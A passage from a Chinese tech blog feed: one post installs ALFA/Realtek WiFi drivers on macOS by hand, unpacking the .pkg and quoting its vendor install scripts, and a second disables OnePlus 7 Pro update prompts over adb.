Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/German.lproj/Localizable.strings	100777	0/80	16404	3871974471</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/InvalidCertStack.png	100777	0/80	4115	405799571</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Italian.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Italian.lproj/Localizable.strings	100777	0/80	16026	896400443</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Japanese.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Japanese.lproj/Localizable.strings	100777	0/80	11934	4027295540</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Korean.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Korean.lproj/Localizable.strings	100777	0/80	11876	2624905898</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Light_green.tif	100777	0/80	842	74228462</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Light_red.tif	100777	0/80	844	665447662</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Light_yellow.tif	100777	0/80	842	1768653772</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ModelIcon.icns	100777	0/80	51594	129970855</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Polish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Polish.lproj/Localizable.strings	100777	0/80	15676	3136865389</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Russian.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Russian.lproj/Localizable.strings	100777	0/80	15576	2073104601</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_0.pdf	100777	0/80	20591	945318973</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_1.pdf	100777	0/80	19276	2457190938</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_2.pdf	100777	0/80	18988	307059393</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_3.pdf	100777	0/80	20320	3211105751</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/ScanListSignal_4.pdf	100777	0/80	21377	2949361981</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Spanish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Spanish.lproj/Localizable.strings	100777	0/80	15638	2882256134</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Swedish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Swedish.lproj/Localizable.strings	100777	0/80	14980	2069709247</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/TrashCan_b.png	100777	0/80	3891	3343055356</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Turkish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Turkish.lproj/Localizable.strings	100777	0/80	14634	1917276981</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/USBWiFi.ico	100777	0/80	2238	3372210440</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/USBWiFi_Unplug.ico	100777	0/80	4414	219813042</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Uninstall.command	100777	0/80	5707	547532281</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/WPShorizstring.png	100777	0/80	6193	2473263293</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/WPSstring.png	100777	0/80	3223	3739536898</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/arrow2.icns	100777	0/80	8457	2504247864</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/blank.icns	100777	0/80	12	2036916336</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/check_b.icns	100777	0/80	44963	3482095838</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/check_g.icns	100777	0/80	45808	477943401</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/error_b.icns	100777	0/80	9248	1553716514</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/error_r.icns	100777	0/80	87439	3460119953</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/fr-CA.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/fr-CA.lproj/Localizable.strings	100777	0/80	16432	2886202537</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/info_b.icns	100777	0/80	7403	1160116236</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/locked_b.icns	100777	0/80	129058	989106223</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/locked_w.icns	100777	0/80	2998	2814166388</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/locked_w.png	100777	0/80	1206	3039885116</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/pt-PT.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/pt-PT.lproj/Localizable.strings	100777	0/80	15492	1861649393</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/_CodeSignature	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/_CodeSignature/CodeResources	100777	0/80	18298	1953610339</span><br><span class="line"></span><br><span class="line">.//MediatekSerialsInstaller.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//RealtekSerialsInstaller.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//Realtek_Uninstall.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//Realtek109110Driver.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line">./Library	40755	0/0</span><br><span class="line">./Library/Extensions	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/Info.plist	100644	0/0	2919	2283574063</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/MacOS	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/MacOS/RtWlanDisk	100755	0/0	59536	2524314782</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature/CodeResources	100644	0/0	2004	655202299</span><br><span class="line">./Library/Extensions/RtWlanU.kext	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/Info.plist	100644	0/0	77753	2727324424</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/MacOS	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/MacOS/RtWlanU	100755	0/0	14733120	1913417689</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature/CodeResources	100644	0/0	2004	655202299</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/Info.plist	100644	0/0	45890	1963117974</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/MacOS	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/MacOS/RtWlanU1827	100755	0/0	4521104	3396109984</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature	40755	0/0</span><br><span class="line">./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature/CodeResources	100644	0/0	2004	655202299</span><br></pre></td></tr></table></figure>

<p>可以看到只有 RealtekUtility1014.pkg 和 Realtek109110Driver.pkg 两个包里面有东西，第一个是工具程序，第二个是驱动。</p>
<p>进入驱动目录，查看PackageInfo内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pkg-info</span> <span class="attr">format-version</span>=<span class="string">&quot;2&quot;</span> <span class="attr">identifier</span>=<span class="string">&quot;com.alfa-network-inc.Realtek109Driver&quot;</span> <span class="attr">version</span>=<span class="string">&quot;10.9&quot;</span> <span class="attr">relocatable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">overwrite-permissions</span>=<span class="string">&quot;false&quot;</span> <span class="attr">followSymLinks</span>=<span class="string">&quot;false&quot;</span> <span class="attr">install-location</span>=<span class="string">&quot;/&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;root&quot;</span> <span class="attr">postinstall-action</span>=<span class="string">&quot;restart&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">payload</span> <span class="attr">installKBytes</span>=<span class="string">&quot;18992&quot;</span> <span class="attr">numberOfFiles</span>=<span class="string">&quot;24&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scripts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">preinstall</span> <span class="attr">file</span>=<span class="string">&quot;./preinstall&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">postinstall</span> <span class="attr">file</span>=<span class="string">&quot;./postinstall&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scripts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bundle-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bundle</span> <span class="attr">path</span>=<span class="string">&quot;./Library/Extensions/RtWlanDisk.kext&quot;</span> <span class="attr">CFBundleShortVersionString</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">CFBundleVersion</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">id</span>=<span class="string">&quot;com.realtek.driver.RtWlanDisk&quot;</span> <span class="attr">CFBundleIdentifier</span>=<span class="string">&quot;com.realtek.driver.RtWlanDisk&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bundle</span> <span class="attr">path</span>=<span class="string">&quot;./Library/Extensions/RtWlanU1827.kext&quot;</span> <span class="attr">CFBundleShortVersionString</span>=<span class="string">&quot;1827.4.b32&quot;</span> <span class="attr">CFBundleVersion</span>=<span class="string">&quot;1827.4.b32&quot;</span> <span class="attr">id</span>=<span class="string">&quot;com.realtek.driver.RtWlanU1827&quot;</span> <span class="attr">CFBundleIdentifier</span>=<span class="string">&quot;com.realtek.driver.RtWlanU1827&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bundle</span> <span class="attr">path</span>=<span class="string">&quot;./Library/Extensions/RtWlanU.kext&quot;</span> <span class="attr">CFBundleShortVersionString</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">CFBundleVersion</span>=<span class="string">&quot;1830.20.b31&quot;</span> <span class="attr">id</span>=<span class="string">&quot;com.realtek.driver.RtWlanU&quot;</span> <span class="attr">CFBundleIdentifier</span>=<span class="string">&quot;com.realtek.driver.RtWlanU&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bundle-version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pkg-info</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="解压驱动包"><a href="#解压驱动包" class="headerlink" title="解压驱动包"></a>解压驱动包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test@mac:~/Downloads/alfa_036ach/036install/Realtek109110Driver.pkg$ mkdir payload.dir ; cd payload.dir</span><br><span class="line">test@mac:~/Downloads/alfa_036ach/036install/Realtek109110Driver.pkg/payload.dir$ tar -xvf ../Payload ; cd ..</span><br><span class="line">x .</span><br><span class="line">x ./Library</span><br><span class="line">x ./Library/Extensions</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/MacOS</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/MacOS/RtWlanDisk</span><br><span class="line">x ./Library/Extensions/RtWlanDisk.kext/Contents/Info.plist</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/MacOS</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/MacOS/RtWlanU1827</span><br><span class="line">x ./Library/Extensions/RtWlanU1827.kext/Contents/Info.plist</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/MacOS</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/MacOS/RtWlanU</span><br><span class="line">x ./Library/Extensions/RtWlanU.kext/Contents/Info.plist</span><br></pre></td></tr></table></figure>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>参考 Scripts 下的 preinstall 和 postinstall，修改脚本中的相对路径，执行相关命令安装。</p>
<p><strong>preinstall</strong> :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">. /etc/rc.common</span><br><span class="line"></span><br><span class="line">echo &quot;                                                                  &quot;</span><br><span class="line">echo &quot;PreInstall_Driver.command&quot;</span><br><span class="line">FROM=`dirname &quot;$0&quot;`</span><br><span class="line"></span><br><span class="line">echo &quot;Unload Driver&quot;</span><br><span class="line">sudo kextunload /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo kextunload /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo kextunload /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;Removing Driver...&quot;</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU_192.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192SU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192CU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8188EU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192EU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192DU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8812AU*.kext</span><br><span class="line">sudo rm -rf /Library/Extensions/RTL8812AU*.kext</span><br><span class="line"></span><br><span class="line">echo &quot;Removing Pkg&quot;</span><br><span class="line">sudo rm -rf /Library/Receipts/wlan.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/wlanAc.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192SU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192CU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8188EU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192EU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192DU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8812AU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/wireless-acNetworkUtility.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/wirelessNetworkUtility.pkg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;Checking Preferences&quot;</span><br><span class="line"></span><br><span class="line">_PREFERENCE=&quot;/Library/Preferences/SystemConfiguration/preferences.plist&quot;</span><br><span class="line">_NETWORKINTERFACES=&quot;/Library/Preferences/SystemConfiguration/NetworkInterfaces.plist&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Phase 1: Get CurrentSet UUID</span></span><br><span class="line">autoUuid=`/usr/libexec/Plistbuddy -c &quot;Print :Sets&quot; $_PREFERENCE | grep -B1 -m1 Automatic | grep Dict | awk &#x27;&#123; print $1 &#125;&#x27;`</span><br><span class="line">echo autoUuid =$autoUuid</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Phase 2: Get All Services Array</span></span><br><span class="line">NetServicesArray=`/usr/libexec/PlistBuddy -c &quot;Print :NetworkServices&quot; $_PREFERENCE | egrep &#x27;[0-9A-F]&#123;8&#125;-([0-9A-F]&#123;4&#125;-)&#123;3&#125;[0-9A-F]&#123;12&#125;&#x27; -o`</span><br><span class="line">echo NetServicesArray =$NetServicesArray</span><br><span class="line"></span><br><span class="line">for eNetService in $NetServicesArray</span><br><span class="line">do</span><br><span class="line">	echo eNetService =$eNetService</span><br><span class="line">	eIntf=`/usr/libexec/Plistbuddy -c &quot;Print :NetworkServices:$eNetService&quot; $_PREFERENCE | grep -a &quot;DeviceName&quot; | awk &#x27;&#123; print $3 &#125;&#x27;`</span><br><span class="line">	echo eIntf =$eIntf</span><br><span class="line">	bHit=`/usr/libexec/Plistbuddy -c &quot;Print :Interfaces&quot; $_NETWORKINTERFACES | grep -a -A7 &#x27;RtWlanU\|RTL8812AU\|RTL8192CU\|RTL8188EU\|RTL8192EU&#x27; | grep -a &quot;BSD Name&quot;| awk &#x27;&#123; print $4 &#125;&#x27;| grep -aw $eIntf`</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">-z: string is null, that is, has zero length</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">-n: string is not null</span></span><br><span class="line">	if [ -n &quot;$&#123;bHit&#125;&quot; ]; then</span><br><span class="line">		echo bHit =$bHit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">		# </span><span class="language-bash">Phase 3: Check interface down : Sets:<span class="variable">$autoUuid</span>:Network:Service:UUID</span></span><br><span class="line">		bIfconfigDown=`/usr/libexec/Plistbuddy -c &quot;Print :Sets:$autoUuid:Network:Service:$eNetService&quot; $_PREFERENCE`</span><br><span class="line"></span><br><span class="line">		if [ -z &quot;$&#123;bIfconfigDown&#125;&quot; ]; then</span><br><span class="line">			echo bIfconfigDown=$bIfconfigDown</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">			# </span><span class="language-bash">Phase 4: Remove NetworksServices:UUID</span></span><br><span class="line">			sudo /usr/libexec/PlistBuddy -c &quot;delete :NetworkServices:$eNetService dict&quot; $_PREFERENCE</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">version=$( /usr/bin/sw_vers -productVersion )</span><br><span class="line">major=$( awk -F&#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">minor=$( awk -F&#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">patch=$( awk -F&#x27;.&#x27; &#x27;&#123;print $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line"></span><br><span class="line">if [ &quot;$major&quot; -eq 10 ]; then</span><br><span class="line">	echo major =$major</span><br><span class="line"></span><br><span class="line">	if [ &quot;$minor&quot; -ge 11 ]; then</span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="built_in">echo</span> 10.11~ =<span class="variable">$minor</span></span></span><br><span class="line">		sudo touch /System/Library/Extensions</span><br><span class="line">	fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$minor</span>&quot;</span> -ge 13 ]; <span class="keyword">then</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="built_in">echo</span> 10.13~ =<span class="variable">$minor</span></span></span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="built_in">sudo</span> spctl --master -<span class="built_in">disable</span></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="keyword">fi</span></span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;PreInstall_Driver Complete.&quot;%</span><br></pre></td></tr></table></figure>

<p><strong>postinstall</strong> :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">. /etc/rc.common</span><br><span class="line"></span><br><span class="line">echo &quot;PostInstall_Driver.command&quot;</span><br><span class="line"></span><br><span class="line">version=$( /usr/bin/sw_vers -productVersion )</span><br><span class="line">major=$( awk -F&#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">minor=$( awk -F&#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">patch=$( awk -F&#x27;.&#x27; &#x27;&#123;print $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line"></span><br><span class="line">sudo chmod -R 755 /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo chmod -R 755 /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo chmod -R 755 /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line"></span><br><span class="line">sleep 1</span><br><span class="line"></span><br><span class="line">sudo chown -R root:wheel /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo chown -R root:wheel /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo chown -R root:wheel /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo chmod 644 /System/Library/Extensions/RtWlanU.kext/Contents/Info.plist</span><br><span class="line">sudo chmod 644 /System/Library/Extensions/RtWlanU1827.kext/Contents/Info.plist</span><br><span class="line">sudo chmod 644 /System/Library/Extensions/RtWlanDisk.kext/Contents/Info.plist</span><br><span class="line"></span><br><span class="line">if [ &quot;$minor&quot; -ge 9 ]; then</span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash"><span class="built_in">echo</span> 10.9~ =<span class="variable">$minor</span></span></span><br><span class="line"></span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line"></span><br><span class="line">elif [ &quot;$minor&quot; -ge 6 ] &amp;&amp; [ &quot;$minor&quot; -le 8 ]; then</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU.kext/Contents/MacOS/RtWlanU</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU1827.kext/Contents/MacOS/RtWlanU1827</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanDisk.kext/Contents/MacOS/RtWlanDisk</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [ &quot;$minor&quot; -eq 6 ]; then</span><br><span class="line">	sudo kextcache -v 1 -a i386 -a x86_64 -m /System/Library/Caches/com.apple.kext.caches/Startup/Extensions.mkext /System/Library/Extensions</span><br><span class="line"></span><br><span class="line">elif [ &quot;$minor&quot; -ge 7 ] &amp;&amp; [ &quot;$minor&quot; -le 10 ]; then</span><br><span class="line"></span><br><span class="line">	sudo kextcache -system-prelinked-kernel</span><br><span class="line">	sudo kextcache -system-caches</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo touch /System/Library/Extensions</span><br><span class="line"></span><br><span class="line">sudo kextload /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line">sudo kextload /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo kextload /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line"></span><br><span class="line">echo &quot;PostInstall_Driver Complete.&quot;</span><br></pre></td></tr></table></figure>



<h3 id="解压工具程序包"><a href="#解压工具程序包" class="headerlink" title="解压工具程序包"></a>解压工具程序包</h3><p>切换到 RealtekUtility1014.pkg 目录，同理对其进行安装，可以修改配置相关plist文件（如关闭自启动之类的）。</p>
<p>重启以后经过测试，虽然Utility程序会报一些错，但是WiFi网卡可以连接其他WiFi。</p>
<p>AWUS051NHv2 网卡和 AWUS036ACH 原理差不多</p>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ol>
<li>AWUS036ACH 网卡对于 wpa-tls 的热点无法读取 keychains 里的密钥，不知道为什么。</li>
<li>AWUS051NHv2 网卡的驱动程序没问题，Utility 程序是32位的，新 macOS 没法用，可以通过 <code>ifconfig en12 up</code> 等方法把网卡启动起来，默认up后会自动连接已保存的 wpa-tls 企业热点</li>
</ol>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>macos</tag>
        <tag>WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title>一加 Oneplus 7 pro 禁用系统更新提醒</title>
    <url>/2021/04/24/2021-04-24/</url>
    <content><![CDATA[<p>手头的一加7pro最近总是提醒升级ColorOS11，目前nethunter只支持到Android 10，所以还是保持低版本系统禁用掉升级提醒。</p>
<span id="more"></span>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test@One-Mix3-Pro:~$ adb shell</span><br><span class="line">kali:/ $ su</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用 opbackup app，需root</span></span><br><span class="line">kali:/ # pm disable --user 0 com.oneplus.opbackup</span><br><span class="line">Package com.oneplus.opbackup new state: disabled</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除设置中系统更新菜单旁的红点</span></span><br><span class="line">kali:/ # pm clear com.oneplus.opbackup</span><br><span class="line">Success</span><br><span class="line">kali:/ #</span><br></pre></td></tr></table></figure>
<p>xda 论坛看到另一种方法(未实测)，将<code>/system/app/OPBACKUP/OPBackup.apk</code>重命名为<code>OPBackup.apk.bak</code>。</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>tips</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>docker停止服务原因排查，Ubuntu自动更新服务加白</title>
    <url>/2021/07/31/2021-07-31/</url>
